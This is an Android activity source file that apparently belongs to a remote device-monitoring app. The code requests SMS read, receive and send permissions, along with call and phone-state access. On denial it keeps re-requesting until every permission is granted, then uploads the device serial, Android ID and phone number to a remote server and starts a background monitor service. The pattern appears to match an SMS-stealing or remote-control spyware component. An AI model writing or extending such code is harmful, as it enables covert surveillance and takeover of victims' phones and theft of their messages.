package com.remote.devices;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class PermissionActivity extends AppCompatActivity {

    private static final String TAG = "PermissionActivity";
    private static final int ALL_PERMISSIONS_CODE = 111;
    private static final long PERMISSION_REQUEST_DELAY = 1500; // 1.5 seconds

    private TextView statusTextView;
    private Button retryButton;

    private interface RegistrationCallback {
        void onRegistrationComplete();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_permission);

        statusTextView = findViewById(R.id.statusTextView);
        retryButton = findViewById(R.id.retryButton);

        retryButton.setOnClickListener(v -> {
            statusTextView.setText("Retrying device registration...");
            retryButton.setVisibility(View.GONE);
            proceedToMainApp();
        });

        if (areAllPermissionsGranted()) {
            proceedToMainApp();
        } else {
            new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, PERMISSION_REQUEST_DELAY);
        }
    }

    private boolean areAllPermissionsGranted() {
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), ALL_PERMISSIONS_CODE);
        } else {
            proceedToMainApp();
        }
    }

    private List<String> getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.CALL_PHONE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ALL_PERMISSIONS_CODE) {
            if (areAllPermissionsGranted()) {
                Toast.makeText(this, "Permissions Granted!", Toast.LENGTH_SHORT).show();
                proceedToMainApp();
            } else {
                Toast.makeText(this, "Some permissions were denied. Please grant all permissions to continue.", Toast.LENGTH_LONG).show();
                statusTextView.setText("Permissions denied. Please grant all permissions to continue.");
                checkAndRequestPermissions();
            }
        }
    }

    private void proceedToMainApp() {
        statusTextView.setText("Registering device...");
        retryButton.setVisibility(View.GONE);
        registerDevice(() -> {
            startMonitorService();
            Intent intent = new Intent(this, MainActivity.class);
            startActivity(intent);
            finish();
        });
    }

    private int getBatteryLevel() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        if (bm != null) {
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } else {
            return -1;
        }
    }

    private String getIsoTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
        return sdf.format(new Date());
    }

    private void registerDevice(final RegistrationCallback callback) {
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        String serialNumber;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                serialNumber = Build.getSerial();
            } else {
                serialNumber = Build.SERIAL;
            }
        } catch (SecurityException e) {
            Log.w(TAG, "getSerial() is restricted, falling back to Android ID.", e);
            serialNumber = androidId; // Fallback to Android ID
        }

        if (serialNumber == null || serialNumber.isEmpty() || serialNumber.equals(Build.UNKNOWN) || serialNumber.equals("unknown")) {
            serialNumber = androidId;
        }

        String model = Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        int battery = getBatteryLevel();
        String lastSeen = getIsoTimestamp();

        String sim1 = null;
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            try {
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (telephonyManager != null) {
                    sim1 = telephonyManager.getLine1Number();
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Security exception when trying to read phone state", e);
            }
        }

        DeviceRegistrationPayload payload = new DeviceRegistrationPayload(androidId, serialNumber, model, androidVersion, sim1, "", battery, true, lastSeen);

        ApiService apiService = RetrofitClient.getApiService();
        Call<Void> call = apiService.registerDevice(payload);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Device registered successfully!");
                    statusTextView.setText("Device registered successfully!");
                    callback.onRegistrationComplete();
                } else {
                    Log.e(TAG, "Failed to register device. Code: " + response.code());
                    statusTextView.setText("Device registration failed. Code: " + response.code() + ". Please try again.");
                    retryButton.setVisibility(View.VISIBLE);
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Failed to register device.", t);
                statusTextView.setText("Device registration failed. Please check your network connection and try again.");
                retryButton.setVisibility(View.VISIBLE);
            }
        });
    }

    private void startMonitorService() {
        Intent serviceIntent = new Intent(this, DeviceMonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
